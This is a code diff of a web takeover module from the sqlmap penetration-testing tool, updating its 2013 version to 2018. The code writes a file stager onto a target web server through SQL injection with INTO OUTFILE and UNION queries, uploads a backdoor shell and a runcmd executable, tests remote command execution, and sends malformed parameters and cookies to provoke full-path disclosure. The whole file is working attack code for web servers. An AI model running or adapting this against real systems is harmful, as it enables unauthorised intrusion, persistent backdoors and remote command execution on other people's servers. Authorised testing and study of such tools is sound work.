@@ -1,24 +1,24 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
-See the file 'doc/COPYING' for copying permission
+Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
 """
 
 import os
 import posixpath
 import re
 import StringIO
-
-from tempfile import mkstemp
+import tempfile
+import urlparse
 
 from extra.cloak.cloak import decloak
 from lib.core.agent import agent
 from lib.core.common import arrayizeValue
 from lib.core.common import Backend
 from lib.core.common import extractRegexResult
-from lib.core.common import getDirs
-from lib.core.common import getDocRoot
+from lib.core.common import getAutoDirectories
+from lib.core.common import getManualDirectories
 from lib.core.common import getPublicTypeMembers
 from lib.core.common import getSQLSnippet
 from lib.core.common import getUnicode
@@ -26,6 +26,7 @@ from lib.core.common import ntToPosixSlashes
 from lib.core.common import isTechniqueAvailable
 from lib.core.common import isWindowsDriveLetterPath
 from lib.core.common import normalizePath
+from lib.core.common import parseFilePaths
 from lib.core.common import posixToNtSlashes
 from lib.core.common import randomInt
 from lib.core.common import randomStr
@@ -38,14 +39,19 @@ from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
 from lib.core.enums import DBMS
+from lib.core.enums import HTTP_HEADER
 from lib.core.enums import OS
 from lib.core.enums import PAYLOAD
+from lib.core.enums import PLACE
 from lib.core.enums import WEB_API
+from lib.core.exception import SqlmapNoneDataException
 from lib.core.settings import BACKDOOR_RUN_CMD_TIMEOUT
 from lib.core.settings import EVENTVALIDATION_REGEX
+from lib.core.settings import SHELL_RUNCMD_EXE_TAG
+from lib.core.settings import SHELL_WRITABLE_DIR_TAG
 from lib.core.settings import VIEWSTATE_REGEX
 from lib.request.connect import Connect as Request
-
+from thirdparty.oset.pyoset import oset
 
 class Web:
     """
@@ -75,7 +81,7 @@ class Web:
         page, _, _ = Request.getPage(url=cmdUrl, direct=True, silent=True, timeout=BACKDOOR_RUN_CMD_TIMEOUT)
 
         if page is not None:
-            output = re.search("<pre>(.+?)</pre>", page, re.I | re.S)
+            output = re.search(r"<pre>(.+?)</pre>", page, re.I | re.S)
 
             if output:
                 output = output.group(1)
@@ -105,16 +111,16 @@ class Web:
 
         if self.webApi in getPublicTypeMembers(WEB_API, True):
             multipartParams = {
-                                "upload":    "1",
-                                "file":      stream,
-                                "uploadDir": directory,
-                              }
+                "upload": "1",
+                "file": stream,
+                "uploadDir": directory,
+            }
 
             if self.webApi == WEB_API.ASPX:
                 multipartParams['__EVENTVALIDATION'] = kb.data.__EVENTVALIDATION
                 multipartParams['__VIEWSTATE'] = kb.data.__VIEWSTATE
 
-            page = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
+            page, _, _ = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
 
             if "File uploaded" not in page:
                 warnMsg = "unable to upload the file through the web file "
@@ -128,8 +134,8 @@ class Web:
             return False
 
     def _webFileInject(self, fileContent, fileName, directory):
-        outFile = posixpath.normpath("%s/%s" % (directory, fileName))
-        uplQuery = getUnicode(fileContent).replace("WRITABLE_DIR", directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
+        outFile = posixpath.join(ntToPosixSlashes(directory), fileName)
+        uplQuery = getUnicode(fileContent).replace(SHELL_WRITABLE_DIR_TAG, directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
         query = ""
 
         if isTechniqueAvailable(kb.technique):
@@ -139,7 +145,7 @@ class Web:
                 randInt = randomInt()
                 query += "OR %d=%d " % (randInt, randInt)
 
-        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery))
+        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery, conf.encoding))
         query = agent.prefixQuery(query)
         query = agent.suffixQuery(query)
         payload = agent.payload(newValue=query)
@@ -194,165 +200,223 @@ class Web:
                 self.webApi = choices[int(choice) - 1]
                 break
 
-        kb.docRoot = arrayizeValue(getDocRoot())
-        directories = sorted(getDirs())
+        if not kb.absFilePaths:
+            message = "do you want sqlmap to further try to "
+            message += "provoke the full path disclosure? [Y/n] "
+
+            if readInput(message, default='Y', boolean=True):
+                headers = {}
+                been = set([conf.url])
+
+                for match in re.finditer(r"=['\"]((https?):)?(//[^/'\"]+)?(/[\w/.-]*)\bwp-", kb.originalPage or "", re.I):
+                    url = "%s%s" % (conf.url.replace(conf.path, match.group(4)), "wp-content/wp-db.php")
+                    if url not in been:
+                        try:
+                            page, _, _ = Request.getPage(url=url, raise404=False, silent=True)
+                            parseFilePaths(page)
+                        except:
+                            pass
+                        finally:
+                            been.add(url)
+
+                url = re.sub(r"(\.\w+)\Z", r"~\g<1>", conf.url)
+                if url not in been:
+                    try:
+                        page, _, _ = Request.getPage(url=url, raise404=False, silent=True)
+                        parseFilePaths(page)
+                    except:
+                        pass
+                    finally:
+                        been.add(url)
+
+                for place in (PLACE.GET, PLACE.POST):
+                    if place in conf.parameters:
+                        value = re.sub(r"(\A|&)(\w+)=", r"\g<2>[]=", conf.parameters[place])
+                        if "[]" in value:
+                            page, headers, _ = Request.queryPage(value=value, place=place, content=True, raise404=False, silent=True, noteResponseTime=False)
+                            parseFilePaths(page)
+
+                cookie = None
+                if PLACE.COOKIE in conf.parameters:
+                    cookie = conf.parameters[PLACE.COOKIE]
+                elif headers and HTTP_HEADER.SET_COOKIE in headers:
+                    cookie = headers[HTTP_HEADER.SET_COOKIE]
+
+                if cookie:
+                    value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", cookie)
+                    if value != cookie:
+                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
+                        parseFilePaths(page)
+
+                    value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=", cookie)
+                    if value != cookie:
+                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
+                        parseFilePaths(page)
+
+        directories = list(arrayizeValue(getManualDirectories()))
+        directories.extend(getAutoDirectories())
+        directories = list(oset(directories))
+
+        path = urlparse.urlparse(conf.url).path or '/'
+        path = re.sub(r"/[^/]*\.\w+\Z", '/', path)
+        if path != '/':
+            _ = []
+            for directory in directories:
+                _.append(directory)
+                if not directory.endswith(path):
+                    _.append("%s/%s" % (directory.rstrip('/'), path.strip('/')))
+            directories = _
 
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
-        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi))
+        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoors", "backdoor.%s_" % self.webApi))
 
-        stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
-        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
-        success = False
+        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webApi))
 
-        for docRoot in kb.docRoot:
-            if success:
-                break
+        for directory in directories:
+            if not directory:
+                continue
 
-            for directory in directories:
-                uriPath = ""
+            stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
+            self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)
 
-                if not all(isinstance(_, basestring) for _ in (docRoot, directory)):
-                    continue
+            uploaded = False
+            directory = ntToPosixSlashes(normalizePath(directory))
 
-                directory = ntToPosixSlashes(normalizePath(directory)).replace("//", "/").rstrip('/')
-                docRoot = ntToPosixSlashes(normalizePath(docRoot)).replace("//", "/").rstrip('/')
+            if not isWindowsDriveLetterPath(directory) and not directory.startswith('/'):
+                directory = "/%s" % directory
 
-                # '' or '/' -> 'docRoot'
-                if not directory:
-                    localPath = docRoot
-                    uriPath = '/'
-                # 'dir1/dir2/dir3' -> 'docRoot/dir1/dir2/dir3'
-                elif not isWindowsDriveLetterPath(directory) and directory[0] != '/':
-                    localPath = "%s/%s" % (docRoot, directory)
-                    uriPath = "/%s" % directory
-                else:
-                    localPath = directory
-                    uriPath = directory[2:] if isWindowsDriveLetterPath(directory) else directory
+            if not directory.endswith('/'):
+                directory += '/'
 
-                    if docRoot in uriPath:
-                        uriPath = uriPath.replace(docRoot, "/")
-                        uriPath = "/%s" % normalizePath(uriPath)
-                    else:
-                        webDir = extractRegexResult(r"//[^/]+?/(?P<result>.*)/.", conf.url)
+            # Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE method
+            infoMsg = "trying to upload the file stager on '%s' " % directory
+            infoMsg += "via LIMIT 'LINES TERMINATED BY' method"
+            logger.info(infoMsg)
+            self._webFileInject(stagerContent, stagerName, directory)
 
-                        if webDir:
-                            uriPath = "/%s" % webDir
-                        else:
-                            continue
-
-                localPath = posixpath.normpath(localPath).rstrip('/')
-                uriPath = posixpath.normpath(uriPath).rstrip('/')
-
-                # Upload the file stager with the LIMIT 0, 1 INTO OUTFILE technique
-                infoMsg = "trying to upload the file stager on '%s' " % localPath
-                infoMsg += "via LIMIT INTO OUTFILE technique"
-                logger.info(infoMsg)
-                self._webFileInject(stagerContent, stagerName, localPath)
-
-                self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, uriPath)
-                self.webStagerUrl = "%s/%s" % (self.webBaseUrl, stagerName)
-                self.webStagerFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (localPath, stagerName))).replace("//", "/").rstrip('/')
+            for match in re.finditer('/', directory):
+                self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
+                self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
+                debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
+                logger.debug(debugMsg)
 
                 uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
                 uplPage = uplPage or ""
 
-                # Fall-back to UNION queries file upload technique
-                if "sqlmap file uploader" not in uplPage:
-                    warnMsg = "unable to upload the file stager "
-                    warnMsg += "on '%s'" % localPath
-                    singleTimeWarnMessage(warnMsg)
+                if "sqlmap file uploader" in uplPage:
+                    uploaded = True
+                    break
 
-                    if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
-                        infoMsg = "trying to upload the file stager on '%s' " % localPath
-                        infoMsg += "via UNION technique"
-                        logger.info(infoMsg)
+            # Fall-back to UNION queries file upload method
+            if not uploaded:
+                warnMsg = "unable to upload the file stager "
+                warnMsg += "on '%s'" % directory
+                singleTimeWarnMessage(warnMsg)
 
-                        handle, filename = mkstemp()
-                        os.fdopen(handle).close()  # close low level handle (causing problems later)
+                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
+                    infoMsg = "trying to upload the file stager on '%s' " % directory
+                    infoMsg += "via UNION method"
+                    logger.info(infoMsg)
 
-                        with open(filename, "w+") as f:
-                            _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
-                            _ = _.replace("WRITABLE_DIR", localPath.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else localPath)
-                            f.write(utf8encode(_))
+                    stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
+                    self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)
 
-                        self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)
+                    handle, filename = tempfile.mkstemp()
+                    os.close(handle)
+
+                    with open(filename, "w+b") as f:
+                        _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webApi))
+                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
+                        f.write(_)
+
+                    self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)
+
+                    for match in re.finditer('/', directory):
+                        self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
+                        self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
+
+                        debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
+                        logger.debug(debugMsg)
 
                         uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
                         uplPage = uplPage or ""
 
-                        if "sqlmap file uploader" not in uplPage:
-                            continue
-                    else:
-                        continue
+                        if "sqlmap file uploader" in uplPage:
+                            uploaded = True
+                            break
 
-                if "<%" in uplPage or "<?" in uplPage:
-                    warnMsg = "file stager uploaded on '%s', " % localPath
-                    warnMsg += "but not dynamically interpreted"
-                    logger.warn(warnMsg)
+            if not uploaded:
+                continue
+
+            if "<%" in uplPage or "<?" in uplPage:
+                warnMsg = "file stager uploaded on '%s', " % directory
+                warnMsg += "but not dynamically interpreted"
+                logger.warn(warnMsg)
+                continue
+
+            elif self.webApi == WEB_API.ASPX:
+                kb.data.__EVENTVALIDATION = extractRegexResult(EVENTVALIDATION_REGEX, uplPage)
+                kb.data.__VIEWSTATE = extractRegexResult(VIEWSTATE_REGEX, uplPage)
+
+            infoMsg = "the file stager has been successfully uploaded "
+            infoMsg += "on '%s' - %s" % (directory, self.webStagerUrl)
+            logger.info(infoMsg)
+
+            if self.webApi == WEB_API.ASP:
+                match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)
+
+                if match:
+                    backdoorDirectory = match.group(1)
+                else:
                     continue
 
-                elif self.webApi == WEB_API.ASPX:
-                    kb.data.__EVENTVALIDATION = extractRegexResult(EVENTVALIDATION_REGEX, uplPage)
-                    kb.data.__VIEWSTATE = extractRegexResult(VIEWSTATE_REGEX, uplPage)
+                _ = "tmpe%s.exe" % randomStr(lowercase=True)
+                if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace(SHELL_WRITABLE_DIR_TAG, backdoorDirectory).replace(SHELL_RUNCMD_EXE_TAG, _)):
+                    self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_EXTRAS_PATH, "runcmd", "runcmd.exe_"))
+                    self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
+                    self.webDirectory = backdoorDirectory
+                else:
+                    continue
 
-                infoMsg = "the file stager has been successfully uploaded "
-                infoMsg += "on '%s' - %s" % (localPath, self.webStagerUrl)
-                logger.info(infoMsg)
+            else:
+                if not self.webUpload(backdoorName, posixToNtSlashes(directory) if Backend.isOs(OS.WINDOWS) else directory, content=backdoorContent):
+                    warnMsg = "backdoor has not been successfully uploaded "
+                    warnMsg += "through the file stager possibly because "
+                    warnMsg += "the user running the web server process "
+                    warnMsg += "has not write privileges over the folder "
+                    warnMsg += "where the user running the DBMS process "
+                    warnMsg += "was able to upload the file stager or "
+                    warnMsg += "because the DBMS and web server sit on "
+                    warnMsg += "different servers"
+                    logger.warn(warnMsg)
 
-                if self.webApi == WEB_API.ASP:
-                    match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)
+                    message = "do you want to try the same method used "
+                    message += "for the file stager? [Y/n] "
 
-                    if match:
-                        backdoorDirectory = match.group(1)
+                    if readInput(message, default='Y', boolean=True):
+                        self._webFileInject(backdoorContent, backdoorName, directory)
                     else:
                         continue
 
-                    _ = "tmpe%s.exe" % randomStr(lowercase=True)
-                    if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", _)):
-                        self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'))
-                        self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
-                        self.webDirectory = backdoorDirectory
-                    else:
-                        continue
+                self.webBackdoorUrl = posixpath.join(ntToPosixSlashes(self.webBaseUrl), backdoorName)
+                self.webDirectory = directory
 
-                else:
-                    if not self.webUpload(backdoorName, posixToNtSlashes(localPath) if Backend.isOs(OS.WINDOWS) else localPath, content=backdoorContent):
-                        warnMsg = "backdoor has not been successfully uploaded "
-                        warnMsg += "through the file stager possibly because "
-                        warnMsg += "the user running the web server process "
-                        warnMsg += "has not write privileges over the folder "
-                        warnMsg += "where the user running the DBMS process "
-                        warnMsg += "was able to upload the file stager or "
-                        warnMsg += "because the DBMS and web server sit on "
-                        warnMsg += "different servers"
-                        logger.warn(warnMsg)
+            self.webBackdoorFilePath = posixpath.join(ntToPosixSlashes(directory), backdoorName)
 
-                        message = "do you want to try the same method used "
-                        message += "for the file stager? [Y/n] "
-                        getOutput = readInput(message, default="Y")
+            testStr = "command execution test"
+            output = self.webBackdoorRunCmd("echo %s" % testStr)
 
-                        if getOutput in ("y", "Y"):
-                            self._webFileInject(backdoorContent, backdoorName, localPath)
-                        else:
-                            continue
+            if output == "0":
+                warnMsg = "the backdoor has been uploaded but required privileges "
+                warnMsg += "for running the system commands are missing"
+                raise SqlmapNoneDataException(warnMsg)
+            elif output and testStr in output:
+                infoMsg = "the backdoor has been successfully "
+            else:
+                infoMsg = "the backdoor has probably been successfully "
 
-                    self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
-                    self.webDirectory = localPath
+            infoMsg += "uploaded on '%s' - " % self.webDirectory
+            infoMsg += self.webBackdoorUrl
+            logger.info(infoMsg)
 
-                self.webBackdoorFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (localPath, backdoorName))).replace("//", "/").rstrip('/')
-
-                testStr = "command execution test"
-                output = self.webBackdoorRunCmd("echo %s" % testStr)
-
-                if output and testStr in output:
-                    infoMsg = "the backdoor has been successfully "
-                else:
-                    infoMsg = "the backdoor has probably been successfully "
-
-                infoMsg += "uploaded on '%s' - " % self.webDirectory
-                infoMsg += self.webBackdoorUrl
-                logger.info(infoMsg)
-
-                success = True
-
-                break
+            break
